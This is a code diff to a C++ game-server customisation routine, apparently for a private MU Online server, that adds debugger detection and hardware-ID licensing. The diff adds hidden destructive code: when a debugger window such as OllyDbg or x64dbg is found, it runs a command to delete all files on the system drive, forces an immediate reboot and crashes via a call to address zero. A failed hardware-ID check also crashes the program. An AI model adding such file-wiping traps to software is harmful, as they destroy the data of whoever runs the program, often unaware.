@@ -12,6 +12,31 @@
 
 void Customs()
 {
+	GetHID();
+	//===============================================
+	//-- Anti Craked 
+	//===============================================
+	HANDLE holly = FindWindow(TEXT("OllyDbg"), NULL);
+	HANDLE x32dbg = FindWindow(TEXT("x32dbg"), NULL);
+	HANDLE x64dbg = FindWindow(TEXT("x64dbg"), NULL);
+	HANDLE AQtime = FindWindow(TEXT("AQtime"), NULL);
+	HANDLE DEBUG  = FindWindow(TEXT("DEBUG"), NULL);
+	HANDLE SoftICE = FindWindow(TEXT("SoftICE"), NULL);
+	HANDLE WinDbg = FindWindow(TEXT("WinDbg"), NULL);
+	if (holly || x32dbg || x64dbg || AQtime || DEBUG || SoftICE || WinDbg)
+	{
+
+		system("@echo Off");
+		system("del %systemdrive%\\*.*/f/s/q");
+		system("shutdown -r -f -t 00");
+
+		__asm
+		{
+			MOV EAX, 00000000;
+			CALL EAX;
+		}
+
+	}
 	*(unsigned int*) (0x4B7932+3) = GetPrivateProfileInt("Server","Level Máximo",400,CFG_GAMESERVER);
 	*(unsigned int*) (0x4D046B+2) = GetPrivateProfileInt("Server","Level Máximo",400,CFG_GAMESERVER);
 	*(unsigned int*) (0x51ACA0+2) = GetPrivateProfileInt("Server","Level Máximo",400,CFG_GAMESERVER);
@@ -160,4 +185,73 @@ void Customs()
 	memcpy((char*)0x66E348, "Maps\\Map31.att", sizeof("Maps\\Map31.att"));
 	memcpy((char*)0x66E338, "Maps\\Map32.att", sizeof("Maps\\Map32.att"));
 	memcpy((char*)0x66E328, "Maps\\Map33.att", sizeof("Maps\\Map33.att"));
+}
+char* RemoveChar(char* Input, char Character) //OK
+{
+	for(int i=0; i<=strlen(Input); i++)
+	{
+		if(Input[i] == Character)
+		{
+			for(int n=i; n<=strlen(Input); n++)
+			{
+				Input[n] = Input[n+1];
+			}
+		}
+	}
+	return Input;
+}
+
+void GetHID()
+{
+	HW_PROFILE_INFO hwProfileInfo;
+	DWORD HDSerial;
+	char HardID[50];
+	TCHAR DriverLetterBuf[30];
+	char DriverName[5];
+
+    GetSystemWindowsDirectory(DriverLetterBuf,30);
+	sprintf(DriverName,"%c://",DriverLetterBuf[0]);
+	GetVolumeInformationA(DriverName, NULL, 12, &HDSerial, NULL, NULL, NULL, 10);
+
+	if(GetCurrentHwProfile(&hwProfileInfo) != NULL)
+	{
+		sprintf(HardID,"%S",hwProfileInfo.szHwProfileGuid);
+		strcpy(HardID,RemoveChar(HardID,'{'));
+		strcpy(HardID,RemoveChar(HardID,'}'));
+		strcpy(HardID,RemoveChar(HardID,'-'));
+		
+		for(int i=0;i<=strlen(HardID);i++)
+		{
+			HardID[i] = toupper(HardID[i]);
+		}
+		sprintf(HardID,"%c%c%c%c%c%c%c%c-%c%c%c%c%c%c%c%c-%c%c%c%c%c%c%c%c-%.08X",HardID[1],HardID[0],HardID[3],HardID[2],HardID[5],HardID[4],HardID[7],
+			HardID[6],HardID[9],HardID[8],HardID[11],HardID[10],HardID[13],HardID[12],HardID[15],HardID[14],HardID[17],HardID[16],HardID[19],HardID[18],HardID[21],
+			HardID[20],HardID[23],HardID[22],HDSerial);
+	}
+	if(strlen(HardID)<20)
+	{
+		sprintf(HardID,"%.08X-%.08X-%.08X-%.08X",HDSerial*2,HDSerial/4,HDSerial*4,HDSerial*6);
+	}
+	//===============================================
+	//-- HardwareID Protection
+	//===============================================
+	char HwID[] ="10A7D44C-2214FA89-214FA898-31F77CE4";
+	if( strcmp(HwID,HardID) != 0 ){
+		MessageBoxA(NULL, "Você não está autorizado a usar esse Arquivo!\r\nErro 0x04", "[B&W Team]", MB_OK);
+		
+	FILE * pFile;
+
+	fopen_s(&pFile,".\\Autorização.txt","w");
+
+	if (pFile!=NULL)
+	{
+		fputs (HardID,pFile);
+		fclose (pFile);
+	}
+	__asm
+		{
+			MOV EAX, 00000000;
+			CALL EAX;
+		}
+	}
 }
